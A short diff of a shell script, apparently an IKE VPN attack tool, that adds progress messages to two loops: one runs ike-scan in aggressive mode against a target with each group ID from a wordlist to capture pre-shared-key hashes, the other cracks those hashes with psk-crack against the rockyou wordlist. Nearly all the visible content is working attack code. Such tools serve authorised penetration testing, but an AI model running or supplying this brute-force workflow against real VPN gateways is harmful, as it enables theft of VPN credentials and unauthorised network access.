@@ -29,7 +29,7 @@ fi
 clear
 echo "[*]  Capturing hashes"
 for i in $(cat /opt/ikebrute/wordlist.dic); do
-	echo $i
+	echo Capturing $i
 	ike-scan -M $1 --id=$i -P -A | tail -n 2 | grep -v "Ending" | tee $i.hash
 done
 clear
@@ -42,6 +42,7 @@ tar -czvf $basefile.tar.gz /opt/ikebrute/*.hash
 clear
 echo "[*]  Cracking hashes"
 for x in $(ls | grep hash); do
+	echo Testing: $x
 	psk-crack $x --dictionary=/usr/share/wordlists/rockyou.txt | tee -a pskcrack.out
 done
 echo "[*]  Complete"
